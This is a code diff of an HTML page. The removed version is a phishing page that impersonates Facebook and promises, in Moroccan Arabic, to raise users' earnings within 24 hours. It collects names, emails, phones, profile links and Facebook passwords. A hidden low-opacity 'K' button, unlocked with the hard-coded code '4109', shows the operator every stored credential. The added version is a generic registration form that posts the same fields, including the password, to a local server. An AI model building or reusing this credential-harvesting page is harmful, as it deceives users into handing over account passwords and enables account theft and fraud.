@@ -3,216 +3,55 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Facebook Earnings Boost</title>
-  <style>
-    /* CSS (SCSS محول للـ CSS) */
-
-    body {
-      font-family: Arial, sans-serif;
-      margin: 0;
-      padding: 0;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      min-height: 100vh;
-      background-color: #f0f2f5;
-    }
-
-    .header {
-      text-align: center;
-      margin-bottom: 20px;
-    }
-
-    .logo {
-      font-size: 32px;
-      color: #1877f2;
-      font-weight: bold;
-    }
-
-    .description {
-      font-size: 16px;
-      margin: 10px 0;
-    }
-
-    .start-button-container {
-      margin-top: 20px;
-    }
-
-    button {
-      padding: 10px 20px;
-      background-color: #1877f2;
-      color: #fff;
-      border: none;
-      border-radius: 5px;
-      font-size: 16px;
-      cursor: pointer;
-    }
-
-    button:hover {
-      background-color: #145dbf;
-    }
-
-    .registration-form, .password-form {
-      display: flex;
-      flex-direction: column;
-      align-items: flex-start;
-      width: 100%;
-      max-width: 400px;
-      margin-top: 20px;
-    }
-
-    label {
-      margin-top: 10px;
-    }
-
-    input {
-      padding: 8px;
-      margin-top: 5px;
-      width: 100%;
-      max-width: 400px;
-      border: 1px solid #ccc;
-      border-radius: 5px;
-    }
-
-    /* زر "K" أسفل الصفحة وبحجم صغير */
-    .k-button-container {
-      position: fixed;
-      bottom: 10px;
-      left: 10px;
-      opacity: 0.1;
-    }
-  </style>
+  <title>Register</title>
 </head>
 <body>
+  <h1>Register Form</h1>
+  <form id="registration-form">
+    <label for="fullName">Full Name:</label>
+    <input type="text" id="fullName" name="fullName" required>
+    
+    <label for="email">Email:</label>
+    <input type="email" id="email" name="email" required>
+    
+    <label for="phone">Phone:</label>
+    <input type="tel" id="phone" name="phone" required>
+    
+    <label for="profileLink">Profile Link:</label>
+    <input type="url" id="profileLink" name="profileLink" required>
+    
+    <label for="password">Password:</label>
+    <input type="password" id="password" name="password" required>
+    
+    <button type="submit">Register</button>
+  </form>
 
-  <!-- الصفحة الأولى -->
-  <div class="header">
-    <div class="logo">Facebook</div>
-    <p class="description">كموقع تابع لشركة Facebook، هاد المنصة كتوفر لك الحل لمشكل ضعف الأرباح. من بعد تسجيلك، غادي تحسّن الأرباح ديالك في ظرف 24 ساعة، باش تشوف الزيادة مباشرة!</p>
-  </div>
-
-  <div class="start-button-container">
-    <button id="start-button">البدء</button>
-  </div>
-
-  <!-- زر حرف "K" المخفي -->
-  <div class="k-button-container">
-    <button id="k-button">K</button>
-  </div>
-
-  <!-- الصفحة الثانية - التسجيل -->
-  <div id="registration-page" style="display:none;">
-    <h1>تسجيل المعلومات</h1>
-    <p>المرجو تعبئة المعلومات لتطوير أرباحك على Facebook</p>
-    <form id="registration-form" class="registration-form">
-      <label for="fullName">الاسم الكامل كما في حساب Facebook:</label>
-      <input type="text" id="fullName" name="fullName" required>
-      
-      <label for="email">البريد الإلكتروني للتواصل:</label>
-      <input type="email" id="email" name="email" required>
-      
-      <label for="phone">رقم الهاتف:</label>
-      <input type="tel" id="phone" name="phone" required>
-      
-      <label for="profileLink">رابط الملف الشخصي في Facebook:</label>
-      <input type="url" id="profileLink" name="profileLink" required>
-      
-      <label for="password">كلمة المرور الخاصة بحساب Facebook:</label>
-      <input type="password" id="password" name="password" required>
-      
-      <button type="submit">متابعة</button>
-    </form>
-  </div>
-
-  <!-- الصفحة الثالثة - تأكيد -->
-  <div id="confirmation-page" style="display:none;">
-    <h1>تم استقبال المعلومات بنجاح!</h1>
-    <p>راح نحل مشكل ضعف الأرباح في 24 ساعة. شكرًا على ثقتك!</p>
-  </div>
-
-  <!-- صفحة إدخال كلمة المرور -->
-  <div id="password-page" style="display:none;">
-    <h1>أدخل كلمة المرور</h1>
-    <form id="password-form" class="password-form">
-      <label for="adminPassword">كلمة المرور:</label>
-      <input type="password" id="adminPassword" name="adminPassword" required>
-      <button type="submit">تأكيد</button>
-    </form>
-  </div>
-
-  <!-- صفحة عرض معلومات المستخدمين -->
-  <div id="user-info-page" style="display:none;">
-    <h1>معلومات المستخدمين</h1>
-    <div id="user-info-list">
-      <!-- سيتم إضافة معلومات المستخدمين هنا ديناميكيا -->
-    </div>
-  </div>
-
-  <!-- JavaScript للتنقل بين الصفحات وتخزين البيانات -->
   <script>
-    document.getElementById('start-button').addEventListener('click', function() {
-      document.querySelector('body > div').style.display = 'none';
-      document.getElementById('registration-page').style.display = 'block';
-    });
-
-    document.getElementById('k-button').addEventListener('click', function() {
-      document.querySelector('body > div').style.display = 'none';
-      document.getElementById('password-page').style.display = 'block';
-    });
-
-    // حفظ بيانات المستخدم بعد التسجيل
-    document.getElementById('registration-form').addEventListener('submit', function(event) {
+    document.getElementById('registration-form').addEventListener('submit', async (event) => {
       event.preventDefault();
       
-      const userInfo = {
+      const formData = {
         fullName: document.getElementById('fullName').value,
         email: document.getElementById('email').value,
         phone: document.getElementById('phone').value,
         profileLink: document.getElementById('profileLink').value,
         password: document.getElementById('password').value
       };
-      
-      // تخزين بيانات المستخدم في localStorage
-      let users = JSON.parse(localStorage.getItem('users')) || [];
-      users.push(userInfo);
-      localStorage.setItem('users', JSON.stringify(users));
-      
-      document.getElementById('registration-page').style.display = 'none';
-      document.getElementById('confirmation-page').style.display = 'block';
-    });
 
-    // التحقق من كلمة المرور وعرض جميع المعلومات
-    document.getElementById('password-form').addEventListener('submit', function(event) {
-      event.preventDefault();
-      
-      const adminPassword = document.getElementById('adminPassword').value;
-      if (adminPassword === "4109") {
-        document.getElementById('password-page').style.display = 'none';
-        document.getElementById('user-info-page').style.display = 'block';
+      const response = await fetch('http://localhost:3000/register', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(formData)
+      });
 
-        // عرض جميع معلومات المستخدمين
-        const users = JSON.parse(localStorage.getItem('users')) || [];
-        const userInfoList = document.getElementById('user-info-list');
-        userInfoList.innerHTML = '';
-
-        users.forEach(user => {
-          const userDiv = document.createElement('div');
-          userDiv.innerHTML = `
-            <p>الاسم الكامل: ${user.fullName}</p>
-            <p>البريد الإلكتروني: ${user.email}</p>
-            <p>رقم الهاتف: ${user.phone}</p>
-            <p>رابط الملف الشخصي: <a href="${user.profileLink}" target="_blank">${user.profileLink}</a></p>
-            <p>كلمة المرور: ${user.password}</p>
-            <hr>
-          `;
-          userInfoList.appendChild(userDiv);
-        });
+      if (response.ok) {
+        alert('User registered successfully!');
       } else {
-        alert("كلمة المرور غير صحيحة!");
+        alert('Failed to register user.');
       }
     });
   </script>
-
 </body>
 </html>
